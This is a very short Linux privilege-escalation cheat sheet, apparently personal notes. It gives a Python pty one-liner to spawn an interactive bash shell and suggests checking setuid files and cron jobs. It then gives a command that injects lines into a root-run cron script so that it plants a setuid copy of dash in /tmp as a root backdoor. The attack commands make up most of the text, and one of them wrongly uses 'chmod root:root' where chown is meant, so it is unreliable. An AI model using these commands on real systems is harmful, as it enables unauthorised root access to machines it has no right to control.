Linux Privilege escalation
==========================

***1. Command to get bash shell from $***

$ python -c 'import pty; pty.spawn("/bin/bash");'  
user@machine:


**2. Identifcation methods**
1. Check su privileged files

2. Check cronjobs
cd /etc/cron* - Check all the folders

**3. Using vulnerable cronjob running in root**
echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit">>/usr/local/sbin/cron-logrotate.sh


